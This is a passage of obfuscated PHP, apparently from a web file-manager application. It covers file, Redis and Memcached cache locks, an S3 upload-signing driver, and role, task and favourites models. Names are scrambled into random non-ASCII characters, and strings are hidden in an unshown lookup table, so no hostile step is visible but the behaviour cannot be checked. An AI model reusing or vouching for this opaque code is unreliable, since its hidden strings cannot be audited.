$ïæÏë∏ˆ; } } goto eî‰‡ä‡„; a˜ÿ˜∫ëç§: class CacheLockFile { private static $cachePath; private static $caches; public function __construct() { $’©¿Í„‰ =& $_SERVER[ß⁄ˆÇ†Œ]; $¯ç•¶Ï = $GLOBALS[$’©¿Í„‰[6]][$’©¿Í„‰[434]]; self::$cachePath = $¯ç•¶Ï[$’©¿Í„‰[230]][$’©¿Í„‰[87]]; @mkdir(self::$cachePath, DEFAULT_PERRMISSIONS, !0); } public function lock($“Øâ’¿ç, $ìö£÷Õµ = 0) { $‹Ö±ß˙Æ =& $_SERVER[ß⁄ˆÇ†Œ]; $åùÅÔÛ∂ = microtime(!0); $˛°Èù–µ = $åùÅÔÛ∂ + $ìö£÷Õµ + 0.0001; $Õ∆ÅÂˆ™ = rtrim(self::$cachePath, $‹Ö±ß˙Æ[8]) . $‹Ö±ß˙Æ[937] . md5($“Øâ’¿ç) . $‹Ö±ß˙Æ[934]; if (file_exists($Õ∆ÅÂˆ™) && filemtime($Õ∆ÅÂˆ™) && filemtime($Õ∆ÅÂˆ™) < time() - 10) { @unlink($Õ∆ÅÂˆ™); } do { if (file_exists($Õ∆ÅÂˆ™)) { cacheLockWait(); continue; } $í„ìñõ– = fopen($Õ∆ÅÂˆ™, $‹Ö±ß˙Æ[938]); if (!$í„ìñõ–) { return !1; } $¯æ—˚èï = flock($í„ìñõ–, LOCK_EX | LOCK_NB); self::$caches[$“Øâ’¿ç] = array($‹Ö±ß˙Æ[939] => $í„ìñõ–, $‹Ö±ß˙Æ[230] => $Õ∆ÅÂˆ™); fwrite($í„ìñõ–, $˛°Èù–µ); clearstatcache(); if ($í„ìñõ– && $¯æ—˚èï) { return !0; } cacheLockWait(); } while (microtime(!0) < $˛°Èù–µ); $this->unlock($“Øâ’¿ç); return !1; } public function lockGet($Àè˝Åá„) { $≤ÏÖœçç =& $_SERVER[ß⁄ˆÇ†Œ]; $⁄Ä±€ãú = rtrim(self::$cachePath, $≤ÏÖœçç[8]) . $≤ÏÖœçç[937] . md5($Àè˝Åá„) . $≤ÏÖœçç[934]; return file_exists($⁄Ä±€ãú); } public function unlock($Íåì„£Ë) { $∑√òê„à =& $_SERVER[ß⁄ˆÇ†Œ]; $∆°Àµ§¢ = self::$caches[$Íåì„£Ë]; if (!$∆°Àµ§¢) { return; } @flock($∆°Àµ§¢[$∑√òê„à[939]], LOCK_UN); @fclose($∆°Àµ§¢[$∑√òê„à[939]]); @unlink($∆°Àµ§¢[$∑√òê„à[230]]); unset(self::$caches[$Íåì„£Ë]); } } class CacheLockRedis { public function lock($≈˙Ùˆ◊Û, $Ú≈¢äŸÛ = 10) { $Ç‡†∑Ø´ = Cache::init(); $»£ƒí√‘ = microtime(!0) + $Ú≈¢äŸÛ; while (microtime(!0) < $»£ƒí√‘) { $∫Ô©ƒ· = $Ç‡†∑Ø´->get($≈˙Ùˆ◊Û); if (!$∫Ô©ƒ·) { $˜Úü§≈à = $Ç‡†∑Ø´->setLock($≈˙Ùˆ◊Û, $»£ƒí√‘, $Ú≈¢äŸÛ); if ($˜Úü§≈à) { return !0; } } else { if ($∫Ô©ƒ· < microtime(!0)) { $Ç‡†∑Ø´->set($≈˙Ùˆ◊Û, $»£ƒí√‘, $Ú≈¢äŸÛ * 2); if ($Ç‡†∑Ø´->get($≈˙Ùˆ◊Û) === $∫Ô©ƒ·) { return !0; } } } cacheLockWait(); } return !1; } public function lockGet($£·‡âãÖ) { return Cache::init()->get($£·‡âãÖ); } public function unlock($Ú•ô¡¶ù) { return Cache::init()->remove($Ú•ô¡¶ù); } } class CacheLockMemcached { public function lock($÷€£ûÔ≥, $Á˙“Ω˜ô = 0) { $º—ÏŒ = Cache::init(); $ˆ‚≤Ò≥› = microtime(!0) + $Á˙“Ω˜ô; while (microtime(!0) < $ˆ‚≤Ò≥›) { $Ë»ﬁ¸áì = $º—ÏŒ->get($÷€£ûÔ≥); if (!$Ë»ﬁ¸áì || $Ë»ﬁ¸áì < microtime(!0)) { $©ﬂ¥êë† = $º—ÏŒ->handle->add($÷€£ûÔ≥, $ˆ‚≤Ò≥›, $Á˙“Ω˜ô); if ($©ﬂ¥êë†) { return !0; } } cacheLockWait(); } return !1; } public function lockGet($–˚¡˝ø≥) { return Cache::init()->get($–˚¡˝ø≥); } public function unlock($ˆ¬µΩÁß) { return Cache::init()->remove($ˆ¬µΩÁß); } } goto Cı∫ø„ÃÔ‚; aåÛ‚Ω‹•†: class PathDriverS3 extends PathDriverBaseS3 { public function __construct($∂◊ÜŒª◊) { parent::__construct($∂◊ÜŒª◊); } public function uploadFormData($ÙÍ©‡”€, $Õ≤±ªƒ† = 3600) { $ç¥Ç»ﬂã =& $_SERVER[ß⁄ˆÇ†Œ]; $˝ä¡¯ˆ´ = $ç¥Ç»ﬂã[229]; $∆˜‹›À± = $ç¥Ç»ﬂã[270]; $úıÎ˜éØ = $ç¥Ç»ﬂã[62]; $÷ôâ…Âó = gmdate($ç¥Ç»ﬂã[271]); $ Ï∞åØÿ = gmdate($ç¥Ç»ﬂã[272]); $÷ö°øŒ£ = $ç¥Ç»ﬂã[273]; $∂û‡ß‹È = $Õ≤±ªƒ† . $ç¥Ç»ﬂã[12]; $æ–¸èêë = $ç¥Ç»ﬂã[274]; $∑äá≥˛¿ = array($this->accessKey, $ Ï∞åØÿ, $this->region, $úıÎ˜éØ, $÷ö°øŒ£); $˘á˝§¨  = implode($ç¥Ç»ﬂã[8], $∑äá≥˛¿); $≤‘ÂπﬂÈ = array($ç¥Ç»ﬂã[275] => gmdate($ç¥Ç»ﬂã[299], strtotime($ç¥Ç»ﬂã[277])), $ç¥Ç»ﬂã[278] => array(array($ç¥Ç»ﬂã[279] => $this->bucket), array($ç¥Ç»ﬂã[280] => $˝ä¡¯ˆ´), array($ç¥Ç»ﬂã[281], $ç¥Ç»ﬂã[282], $ç¥Ç»ﬂã[12]), array($ç¥Ç»ﬂã[281], $ç¥Ç»ﬂã[283], $ç¥Ç»ﬂã[12]), array($ç¥Ç»ﬂã[281], $ç¥Ç»ﬂã[284], $ç¥Ç»ﬂã[12]), array($ç¥Ç»ﬂã[285] => $æ–¸èêë), array($ç¥Ç»ﬂã[286] => $˘á˝§¨ ), array($ç¥Ç»ﬂã[287] => $∆˜‹›À±), array($ç¥Ç»ﬂã[288] => $÷ôâ…Âó), array($ç¥Ç»ﬂã[289] => $∂û‡ß‹È))); $⁄ÃÑÉòÙ = base64_encode(json_encode($≤‘ÂπﬂÈ)); $∫Òê•ãÛ = hash_hmac($ç¥Ç»ﬂã[290], $ Ï∞åØÿ, $ç¥Ç»ﬂã[291] . $this->secret, !0); $Ï€°æ = hash_hmac($ç¥Ç»ﬂã[290], $this->region, $∫Òê•ãÛ, !0); $≤±ˆí¯õ = hash_hmac($ç¥Ç»ﬂã[290], $úıÎ˜éØ, $Ï€°æ, !0); $ÑÓ…π»¥ = hash_hmac($ç¥Ç»ﬂã[290], $÷ö°øŒ£, $≤±ˆí¯õ, !0); $´ﬁœ«„ƒ = hash_hmac($ç¥Ç»ﬂã[290], $⁄ÃÑÉòÙ, $ÑÓ…π»¥); $Œ÷⁄ûΩ⁄ = array($ç¥Ç»ﬂã[246] => $ç¥Ç»ﬂã[12], $ç¥Ç»ﬂã[292] => $ç¥Ç»ﬂã[12], $ç¥Ç»ﬂã[280] => $˝ä¡¯ˆ´, $ç¥Ç»ﬂã[285] => $æ–¸èêë, $ç¥Ç»ﬂã[293] => $⁄ÃÑÉòÙ, $ç¥Ç»ﬂã[294] => $˘á˝§¨ , $ç¥Ç»ﬂã[295] => $∆˜‹›À±, $ç¥Ç»ﬂã[296] => $÷ôâ…Âó, $ç¥Ç»ﬂã[297] => $∂û‡ß‹È, $ç¥Ç»ﬂã[298] => $´ﬁœ«„ƒ, $ç¥Ç»ﬂã[208] => $this->getHost()); return $Œ÷⁄ûΩ⁄; } public function multiUploadFormData($ıÙêÓ⁄ü, $˘”´ó˝• = 3600) { $ìêêåÒ¥ =& $_SERVER[ß⁄ˆÇ†Œ]; $˝˘™ã¬„ = gmdate($ìêêåÒ¥[300]); $Ù‹óó€œ = array(); $º≥ÌöÒ£ = $this->client->getUploadId($this->bucket, $ıÙêÓ⁄ü, $Ù‹óó€œ); if (!$º≥ÌöÒ£) { return !1; } return array($ìêêåÒ¥[254] => $º≥ÌöÒ£, $ìêêåÒ¥[208] => $this->getHost() . $ìêêåÒ¥[8] . $this->pathEncode($ıÙêÓ⁄ü), $ìêêåÒ¥[255] => $˝˘™ã¬„, $ìêêåÒ¥[97] => $ıÙêÓ⁄ü); } public function multiUploadAuthData($§¢∏≥–æ, $ü≠‰·Õâ = array()) { $°œÅ∑‘« =& $_SERVER[ß⁄ˆÇ†Œ]; $˜ÔìÂí = isset($ü≠‰·Õâ[$°œÅ∑‘«[169]]) ? $ü≠‰·Õâ[$°œÅ∑‘«[169]] : $°œÅ∑‘«[12]; $„•åÈËÀ = $ü≠‰·Õâ[$°œÅ∑‘«[97]]; unset($ü≠‰·Õâ[$°œÅ∑‘«[97]]); if (isset($ü≠‰·Õâ[$°œÅ∑‘«[256]])) { return $this->listUploadParts($„•åÈËÀ, $ü≠‰·Õâ); } $ò»æ±è© = array(); if (isset($ü≠‰·Õâ[$°œÅ∑‘«[301]])) { $ò»æ±è©[$°œÅ∑‘«[302]] = $ü≠‰·Õâ[$°œÅ∑‘«[301]]; } $ΩÔ†Ïﬂ÷ = explode($°œÅ∑‘«[210], $this->getHost()); $∫„Èœ≤∏ = array($°œÅ∑‘«[303] => $ΩÔ†Ïﬂ÷[1], $°œÅ∑‘«[304] => $°œÅ∑‘«[12], $°œÅ∑‘«[246] => $°œÅ∑‘«[123], $°œÅ∑‘«[292] => $ü≠‰·Õâ[$°œÅ∑‘«[79]]); $Ô£©˙˚ = $°œÅ∑‘«[259]; $Í¯£˘Œ· = $°œÅ∑‘«[8] . $this->pathEncode($„•åÈËÀ) . $˜ÔìÂí; $πûß∆µø = $this->client->__getSignatureV4($ò»æ±è©, $∫„Èœ≤∏, $Ô£©˙˚, $Í¯£˘Œ·); if (strpos($˜ÔìÂí, $°œÅ∑‘«[258]) === 0) { if (isset($ò»æ±è©[$°œÅ∑‘«[302]])) { $∑ãÅÊ´≤ = $ò»æ±è©[$°œÅ∑‘«[302]]; } else { if (isset($πûß∆µø[$°œÅ∑‘«[302]])) { $∑ãÅÊ´≤ = $πûß∆µø[$°œÅ∑‘«[302]]; } else { $∑ãÅÊ´≤ = hash($°œÅ∑‘«[290], $°œÅ∑‘«[12]); } } return array($°œÅ∑‘«[265] => $πûß∆µø[$°œÅ∑‘«[265]], $°œÅ∑‘«[302] => $∑ãÅÊ´≤, $°œÅ∑‘«[255] => $πûß∆µø[$°œÅ∑‘«[305]]); } return $πûß∆µø[$°œÅ∑‘«[265]]; } public function listUploadParts($ú¸®Ωªô, $“≈˜ª§ = array()) { $⁄≈ÂÓö• =& $_SERVER[ß⁄ˆÇ†Œ]; $ıº˜ƒâÓ = str_replace($⁄≈ÂÓö•[266], $⁄≈ÂÓö•[12], $“≈˜ª§[$⁄≈ÂÓö•[169]]); $ß°Ùœ Ó = $this->client->listParts($this->bucket, $ú¸®Ωªô, $ıº˜ƒâÓ); if (!$ß°Ùœ Ó) { return !1; } $Ç±≤æ≈≈ = $⁄≈ÂÓö•[306]; foreach ($ß°Ùœ Ó as $ŸÕ≠≈ã£) { $Ç±≤æ≈≈ .= $⁄≈ÂÓö•[307] . "\74\120\x61\162\164\116\x75\155\142\x65\x72\76{$ŸÕ≠≈ã£[$⁄≈ÂÓö•[308]]}\74\57\x50\141\x72\x74\116\x75\x6d\142\145\x72\x3e\xa" . "\74\105\124\x61\147\x3e{$ŸÕ≠≈ã£[$⁄≈ÂÓö•[309]]}\x3c\57\105\x54\x61\x67\x3e\xa" . $⁄≈ÂÓö•[310]; } $Ç±≤æ≈≈ .= $⁄≈ÂÓö•[311]; $Ï˛∞Â˝Ú = array(); $û÷àø⁄Ê = explode($⁄≈ÂÓö•[210], $this->getHost()); $·Ïˆ§Ê∑ = array($⁄≈ÂÓö•[303] => $û÷àø⁄Ê[1], $⁄≈ÂÓö•[246] => $⁄≈ÂÓö•[123], $⁄≈ÂÓö•[292] => strlen($Ç±≤æ≈≈)); $á€Ï≈‘ˆ = $⁄≈ÂÓö•[257]; $ÇûÃêú≠ = $⁄≈ÂÓö•[8] . $this->pathEncode($ú¸®Ωªô) . $“≈˜ª§[$⁄≈ÂÓö•[169]]; $Œ¡éÔÙü = $this->client->__getSignatureV4($Ï˛∞Â˝Ú, $·Ïˆ§Ê∑, $á€Ï≈‘ˆ, $ÇûÃêú≠, $Ç±≤æ≈≈); return array($⁄≈ÂÓö•[265] => $Œ¡éÔÙü[$⁄≈ÂÓö•[265]], $⁄≈ÂÓö•[255] => $Œ¡éÔÙü[$⁄≈ÂÓö•[305]], $⁄≈ÂÓö•[267] => $ß°Ùœ Ó, $⁄≈ÂÓö•[302] => $Œ¡éÔÙü[$⁄≈ÂÓö•[302]]); } public function link($öîŒöªæ, $ãÌâÀº† = array()) { return parent::link($öîŒöªæ, $ãÌâÀº†); } public function fileOut($õ¶âààÂ, $¶°ªúﬂ„ = false, $ﬂË‚¶…µ = false, $ƒªœëöõ = '') { if ($this->isFileOutServer() || strstr($this->endpoint, $_SERVER[ß⁄ˆÇ†Œ][312])) { return parent::fileOutServer($õ¶âààÂ, $¶°ªúﬂ„, $ﬂË‚¶…µ, $ƒªœëöõ); } parent::fileOut($õ¶âààÂ, $¶°ªúﬂ„, $ﬂË‚¶…µ, $ƒªœëöõ); } public function fileOutImage($î—ﬂèæ§, $ÆÅ≈‹Íﬂ = 250) { if (strstr($this->endpoint, $_SERVER[ß⁄ˆÇ†Œ][312])) { return parent::fileOutImageServer($î—ﬂèæ§, $ÆÅ≈‹Íﬂ); } parent::fileOutImage($î—ﬂèæ§, $ÆÅ≈‹Íﬂ); } public function fileOutLink($‹ÉŸ‚∏Â) { $ñÏê·»ó =& $_SERVER[ß⁄ˆÇ†Œ]; if (substr($‹ÉŸ‚∏Â, 0, 7) == $ñÏê·»ó[313]) { $‹ÉŸ‚∏Â = $ñÏê·»ó[314] . substr($‹ÉŸ‚∏Â, 7); } header($ñÏê·»ó[175] . $‹ÉŸ‚∏Â); die; } } define($_SERVER[ß⁄ˆÇ†Œ][315], 1); define($_SERVER[ß⁄ˆÇ†Œ][316], 2); goto e ¡¢çÔüƒ; Bç¿ÃıÎ‚: class SystemRoleModel extends ModelBaseLight { public $optionType = "\x53\x79\x73\x74\145\155\x2e\162\157\x6c\x65\x4c\x69\163\164"; public $field = array("\x6e\x61\155\145", "\141\x75\164\x68", "\154\141\142\145\154", "\144\151\x73\x70\154\141\171", "\x73\x79\x73\x74\145\x6d", "\x64\145\163\x63", "\x69\x67\156\157\x72\145\x45\170\x74", "\151\147\x6e\x6f\x72\x65\106\151\x6c\x65\x53\151\172\x65", "\x61\144\155\151\x6e\x69\x73\x74\162\x61\164\157\162", "\x73\x6f\162\164"); public function listData($ãŸ´≤˙÷ = false, $∆òâ∞≈— = "\x73\x6f\162\x74", $ÚÏµ—Ï” = false) { $òóÓ±´° =& $_SERVER[ß⁄ˆÇ†Œ]; $Ê¶¡∑Õ¥ = parent::listData($ãŸ´≤˙÷, $∆òâ∞≈—, $ÚÏµ—Ï”); if (!$ãŸ´≤˙÷) { foreach ($Ê¶¡∑Õ¥ as $±⁄≤ﬂﬂÈ => $¢Åêπˆ‚) { if ($¢Åêπˆ‚[$òóÓ±´°[2170]] == 1) { $Ê¶¡∑Õ¥[$±⁄≤ﬂﬂÈ][$òóÓ±´°[534]] = LNG($òóÓ±´°[2432]); } } } return $Ê¶¡∑Õ¥; } public function update($∂∏ú›ˆÛ, $∞¶ïî∂˙) { $ø´∏Ÿë =& $_SERVER[ß⁄ˆÇ†Œ]; $ôŸ¡ÿŒ≈ = parent::listData($∂∏ú›ˆÛ); $Â¥Õ–ﬁ– = $this->findByName($∞¶ïî∂˙[$ø´∏Ÿë[32]]); if (!$ôŸ¡ÿŒ≈ || $Â¥Õ–ﬁ– && $Â¥Õ–ﬁ–[$ø´∏Ÿë[483]] != $ôŸ¡ÿŒ≈[$ø´∏Ÿë[483]]) { return !1; } if ($Â¥Õ–ﬁ–[$ø´∏Ÿë[2170]] == 1) { $∞¶ïî∂˙ = array($ø´∏Ÿë[32] => $∞¶ïî∂˙[$ø´∏Ÿë[32]], $ø´∏Ÿë[1986] => $∞¶ïî∂˙[$ø´∏Ÿë[1986]]); } $this->filterAuth($∞¶ïî∂˙[$ø´∏Ÿë[495]]); return parent::update($∂∏ú›ˆÛ, $∞¶ïî∂˙); } public function remove($ÂŒ’ç≠¨) { $Éã»‹Ô¥ = parent::listData($ÂŒ’ç≠¨); if (!$Éã»‹Ô¥ || $Éã»‹Ô¥[$_SERVER[ß⁄ˆÇ†Œ][191]]) { return !1; } return parent::remove($ÂŒ’ç≠¨); } public function add($‹Èºÿƒ›) { $≥ó¸≠±¢ =& $_SERVER[ß⁄ˆÇ†Œ]; $∑∑±‡√é = $‹Èºÿƒ›[$≥ó¸≠±¢[32]]; if ($this->findByName($∑∑±‡√é)) { return !1; } $ «Õô£á = array($≥ó¸≠±¢[502] => $∑∑±‡√é, $≥ó¸≠±¢[1969] => $≥ó¸≠±¢[12], $≥ó¸≠±¢[1965] => $≥ó¸≠±¢[1973], $≥ó¸≠±¢[2433] => 1, $≥ó¸≠±¢[1968] => 0, $≥ó¸≠±¢[2434] => 0, $≥ó¸≠±¢[1967] => $this->getSort()); $‹Èºÿƒ› = array_merge($ «Õô£á, $‹Èºÿƒ›); $this->filterAuth($‹Èºÿƒ›[$≥ó¸≠±¢[495]]); return parent::insert($‹Èºÿƒ›); } private function getSort() { $ÕÜ±à›£ =& $_SERVER[ß⁄ˆÇ†Œ]; $˙÷õãÕå = parent::listData(); $‚Î°ØÅÎ = array_to_keyvalue($˙÷õãÕå, $ÕÜ±à›£[12], $ÕÜ±à›£[1987]); return empty($‚Î°ØÅÎ) ? 0 : max($‚Î°ØÅÎ) + 1; } private function filterAuth(&$ê¡ÜóŒÎ) { $…Ÿá©è‘ =& $_SERVER[ß⁄ˆÇ†Œ]; $ú©ƒÃπª = array(); $¸”·‹Û = array_filter(explode($…Ÿá©è‘[50], $ê¡ÜóŒÎ)); foreach ($¸”·‹Û as $ê¡ÜóŒÎ) { $¿≤æªºü = explode($…Ÿá©è‘[10], $ê¡ÜóŒÎ); if ($¿≤æªºü[0] == $…Ÿá©è‘[2435] && $¿≤æªºü[1] != $…Ÿá©è‘[1271]) { $ã¯ §ã = $¿≤æªºü[0] . $…Ÿá©è‘[10] . $¿≤æªºü[1] . $…Ÿá©è‘[2436]; if (!in_array($ã¯ §ã, $¸”·‹Û)) { $ú©ƒÃπª[] = $ã¯ §ã; } } $ú©ƒÃπª[] = $ê¡ÜóŒÎ; } $ê¡ÜóŒÎ = implode($…Ÿá©è‘[50], $ú©ƒÃπª); } public function findRoleDefault() { $Ö÷ŒÉº± =& $_SERVER[ß⁄ˆÇ†Œ]; $¡Ÿ–îõ⁄ = parent::listData(); $åÅ∏¬ïÆ = !1; foreach ($¡Ÿ–îõ⁄ as $†óâØªÛ) { if (!$†óâØªÛ || $†óâØªÛ[$Ö÷ŒÉº±[1985]] == $Ö÷ŒÉº±[228] || $†óâØªÛ[$Ö÷ŒÉº±[2170]] == 1) { continue; } if (strstr($†óâØªÛ[$Ö÷ŒÉº±[495]], $Ö÷ŒÉº±[2437])) { continue; } if (!strstr($†óâØªÛ[$Ö÷ŒÉº±[495]], $Ö÷ŒÉº±[2438])) { continue; } if (!$åÅ∏¬ïÆ) { $åÅ∏¬ïÆ = $†óâØªÛ; continue; } $ú›÷∆© = explode($Ö÷ŒÉº±[50], $åÅ∏¬ïÆ[$Ö÷ŒÉº±[495]]); $à®ñß∏Ï = explode($Ö÷ŒÉº±[50], $†óâØªÛ[$Ö÷ŒÉº±[495]]); if (count($ú›÷∆©) > count($à®ñß∏Ï)) { $åÅ∏¬ïÆ = $†óâØªÛ; } } return $åÅ∏¬ïÆ ? $åÅ∏¬ïÆ[$Ö÷ŒÉº±[483]] : $Ö÷ŒÉº±[12]; } public function sort($¬Ö‰Åé´, $óÏ¨ﬂÊ) { return parent::update($¬Ö‰Åé´, $óÏ¨ﬂÊ); } } class SystemTaskModel extends ModelBaseLight { public $optionType = "\x53\171\x73\164\x65\x6d\x2e\x74\x61\163\x6b\x4c\151\163\x74"; public $field = array("\156\141\155\145", "\164\171\x70\x65", "\145\166\x65\x6e\164", "\x74\151\155\145", "\x64\145\x73\143", "\x73\171\163\164\x65\155", "\145\x6e\141\142\154\145", "\x6c\x61\x73\164\x52\x75\x6e", "\x73\157\x72\x74"); public function listData($ËõÛìœ¿ = false, $ö›üÉπ∑ = "\163\157\162\x74", $˛î◊î±Œ = false) { return parent::listData($ËõÛìœ¿, $ö›üÉπ∑, $˛î◊î±Œ); } public function add($∏ˆì¥∏‹) { $·ÖÒüÂ =& $_SERVER[ß⁄ˆÇ†Œ]; $á°ﬂ™Ñ = $this->findByName($∏ˆì¥∏‹[$·ÖÒüÂ[32]]); if ($á°ﬂ™Ñ) { return !1; } $∏ˆì¥∏‹[$·ÖÒüÂ[1715]] = 0; $∏ˆì¥∏‹[$·ÖÒüÂ[1987]] = $this->getSort(); return parent::insert($∏ˆì¥∏‹); } private function getSort() { $›ì·≠‘À =& $_SERVER[ß⁄ˆÇ†Œ]; $ñ∑‹Á∂ù = parent::listData(); $ÙÁ«ÚüÜ = array_to_keyvalue($ñ∑‹Á∂ù, $›ì·≠‘À[12], $›ì·≠‘À[1987]); return empty($ÙÁ«ÚüÜ) ? 0 : max($ÙÁ«ÚüÜ) + 1; } public function update($†∞‚Ω©…, $ÿäŸœ·Ö) { $¥Âê…⁄Â =& $_SERVER[ß⁄ˆÇ†Œ]; $´≈¯‡◊± = $this->listData($†∞‚Ω©…); $èÄé‚‘∑ = $this->findByName($ÿäŸœ·Ö[$¥Âê…⁄Â[32]]); if (!$´≈¯‡◊± || $èÄé‚‘∑ && $èÄé‚‘∑[$¥Âê…⁄Â[483]] != $´≈¯‡◊±[$¥Âê…⁄Â[483]]) { return !1; } return parent::update($†∞‚Ω©…, $ÿäŸœ·Ö); } public function remove($Ùı˙≤û, $œÛ”Ì∂» = false) { $éı«ÓÀ‰ =& $_SERVER[ß⁄ˆÇ†Œ]; $•æµÑ≠∏ = $this->listData($Ùı˙≤û); if (!$•æµÑ≠∏) { return; } if (!$œÛ”Ì∂» && $•æµÑ≠∏[$éı«ÓÀ‰[191]] == $éı«ÓÀ‰[91]) { return !1; } return parent::remove($Ùı˙≤û); } public function enable($à◊◊Ë˚ , $£¥Æ£Ûê) { return $this->update($à◊◊Ë˚ , array($_SERVER[ß⁄ˆÇ†Œ][2427] => $£¥Æ£Ûê)); } public function run($å©ÍËãÜ) { return $this->update($å©ÍËãÜ, array($_SERVER[ß⁄ˆÇ†Œ][2439] => time())); } } class UserFavModel extends ModelBase { protected $tableName = "\165\163\x65\162\137\x66\141\166"; protected function cacheFunctionAlias($¶òü÷¸‚) { $Ü≈ﬁÎÂº =& $_SERVER[ß⁄ˆÇ†Œ]; return array($Ü≈ﬁÎÂº[2078] => array(USER_ID, $Ü≈ﬁÎÂº[2440])); } protected function listData() { $¯¯…Ë–¸ =& $_SERVER[ß⁄ˆÇ†Œ]; $πÌÒﬂ·Ø = array($¯¯…Ë–¸[1755] => USER_ID, $¯¯…Ë–¸[565] => 0); $Ñ´Ÿã⁄ = $¯¯…Ë–¸[2441]; $‡ÎøÏÿ… = $this->field($Ñ´Ÿã⁄)->where($πÌÒﬂ·Ø)->order($¯¯…Ë–¸[2442])->select(); return $‡ÎøÏÿ… ? $‡ÎøÏÿ… : array(); } protected function resetCache() { } protected function listView() { $´˘“–Éï =& $_SERVER[ß⁄ˆÇ†Œ]; $ãÛ£†ÄÂ = $this->listData(); $Ωòû≈œ“ = array_filter_by_field($ãÛ£†ÄÂ, $´˘“–Éï[33], $´˘“–Éï[498]); $Â˘õ©ºÑ = array_to_keyvalue($Ωòû≈œ“, $´˘“–Éï[12], $´˘“–Éï[87]); if (!$Â˘õ©ºÑ) { return $ãÛ£†ÄÂ; } $ØåÏñ®é = 2000; $ö¸É±Õü = array($´˘“–Éï[499] => array($´˘“–Éï[500], $Â˘õ©ºÑ)); $ö≈Ú¬∂¬ = Model($´˘“–Éï[897])->listSource($ö¸É±Õü, $ØåÏñ®é); $ö≈Ú¬∂¬ = array_merge($ö≈Ú¬∂¬[$´˘“–Éï[86]], $ö≈Ú¬∂¬[$´˘“–Éï[85]]); $ö≈Ú¬∂¬ = array_to_keyvalue($ö≈Ú¬∂¬, $´˘“–Éï[193]); foreach ($ãÛ£†ÄÂ as $§Ó¨∑¶´ => $Âﬂ‰Ò¥ˆ) { $Åîç›Éä = $ö≈Ú¬∂¬[$Âﬂ‰Ò¥ˆ[$´˘“–Éï[87]]]; $Åîç›Éä = $Åîç›Éä ? $Åîç›Éä : array(); $ãÛ£†ÄÂ[$§Ó¨∑¶´] = array_merge($Åîç›Éä, $Âﬂ‰Ò¥ˆ); } return $ãÛ£†ÄÂ; } protected function addFav($‰ûÊ˙º£, $µüùï˚æ = '', $£∑∏Ç∞õ = "\163\x6f\165\162\x63\x65") { $Êã≤¸œŸ =& $_SERVER[ß⁄ˆÇ†Œ]; $Û’»•Ì¡ = array($Êã≤¸œŸ[1755] => USER_ID, $Êã≤¸œŸ[565] => 0, $Êã≤¸œŸ[504] => $£∑∏Ç∞õ, $Êã≤¸œŸ[503] => $‰ûÊ˙º£); if ($this->where($Û’»•Ì¡)->find()) { return !1; } $Û’»•Ì¡ = array($Êã≤¸œŸ[1755] => USER_ID, $Êã≤¸œŸ[565] => 0); $√ŒÆ∆º∂ = $this->where($Û’»•Ì¡)->max($Êã≤¸œŸ[1987]); if (!$√ŒÆ∆º∂) { $√ŒÆ∆º∂ = 0; } if (!$µüùï˚æ && $£∑∏Ç∞õ == $Êã≤¸œŸ[498]) { $ã„ÂÎË® = Model($Êã≤¸œŸ[1414])->where(array($Êã≤¸œŸ[499] => $‰ûÊ˙º£))->find(); if (!$ã„ÂÎË®) { return !1; } $µüùï˚æ = $ã„ÂÎË®[$Êã≤¸œŸ[32]]; } $µüùï˚æ = $this->getAutoName($µüùï˚æ); $⁄ ƒﬂ˜© = array($Êã≤¸œŸ[1755] => USER_ID, $Êã≤¸œŸ[565] => 0, $Êã≤¸œŸ[502] => $µüùï˚æ, $Êã≤¸œŸ[503] => $‰ûÊ˙º£, $Êã≤¸œŸ[504] => $£∑∏Ç∞õ, $Êã≤¸œŸ[1967] => $√ŒÆ∆º∂ + 1); return $this->add($⁄ ƒﬂ˜©); } protected function remove($ﬁÆÉﬁ·∫) { $æî‰Ìÿ‚ =& $_SERVER[ß⁄ˆÇ†Œ]; $˝ƒè˚∆è = array($æî‰Ìÿ‚[1755] => USER_ID, $æî‰Ìÿ‚[501] => $ﬁÆÉﬁ·∫); return $this->where($˝ƒè˚∆è)->delete(); } protected function removeByName($®ùŸÅçπ) { $Ë¨≠ßﬁü =& $_SERVER[ß⁄ˆÇ†Œ]; $¸¥¡ïÒŒ = array($Ë¨≠ßﬁü[1755] => USER_ID, $Ë¨≠ßﬁü[502] => $®ùŸÅçπ, $Ë¨≠ßﬁü[565] => 0); return $this->where($¸¥¡ïÒŒ)->delete(); } protected function rename($¯’¨◊∆ã, $ïµÌ°‚Í) { $ôﬁ∑¥¸¬ =& $_SERVER[ß⁄ˆÇ†Œ]; if ($¯’¨◊∆ã == $ïµÌ°‚Í) { return !1; } $›ßΩ§Æ´ = $this->getAutoName($ïµÌ°‚Í); if ($ïµÌ°‚Í != $›ßΩ§Æ´) { return !1; } $˙È˛Â¨ü = array($ôﬁ∑¥¸¬[1755] => USER_ID, $ôﬁ∑¥¸¬[565] => 0, $ôﬁ∑¥¸¬[32] => $¯’¨◊∆ã); return $this->where($˙È˛Â¨ü)->save(array($ôﬁ∑¥¸¬[32] => $ïµÌ°‚Í)); } protected function resetSort($ÓÅ§µòô) { $äÙÑ™‰õ =& $_SERVER[ß⁄ˆÇ†Œ]; $ÓÅ§µòô = is_array($ÓÅ§µòô) ? $ÓÅ§µòô : array(); $–µ„ Òœ = array($äÙÑ™‰õ[1755] => USER_ID); for ($Üù÷«ﬂ = 0; $Üù÷«ﬂ < count($ÓÅ§µòô); $Üù÷«ﬂ++) { $–µ„ Òœ[$äÙÑ™‰õ[501]] = $ÓÅ§µòô[$Üù÷«ﬂ]; $this->where($–µ„ Òœ)->save(array($äÙÑ™‰õ[1967] => $Üù÷«ﬂ + 1)); } return !0; } protected function moveTop($≠‡•±“á) { $–’ú ¸∆ =& $_SERVER[ß⁄ˆÇ†Œ]; $‡∂≠â¨ = array($–’ú ¸∆[1755] => USER_ID, $–’ú ¸∆[565] => 0); $ûñà≥∞™ = $this->where($‡∂≠â¨)->where(array($–’ú ¸∆[32] => $≠‡•±“á))->find(); if (!$ûñà≥∞™) { return; } $ò•¨≠ ’ = $this->field($–’ú ¸∆[483])->where($‡∂≠â¨)->order($–’ú ¸∆[2442])->select(); $ò•¨≠ ’ = array_to_keyvalue($ò•¨≠ ’, $–’ú ¸∆[12], $–’ú ¸∆[483]); $Ë‚í¢πó = $ò•¨≠ ’; $ò•¨≠ ’ = array_remove_value($ò•¨≠ ’, $ûñà≥∞™[$–’ú ¸∆[483]]); array_unshift($ò•¨≠ ’, $ûñà≥∞™[$–’ú ¸∆[483]]); return $this->resetSort($ò•¨≠ ’); } protected function moveBottom($ƒ‹àÎÉ‡) { $ôæ•∂öø =& 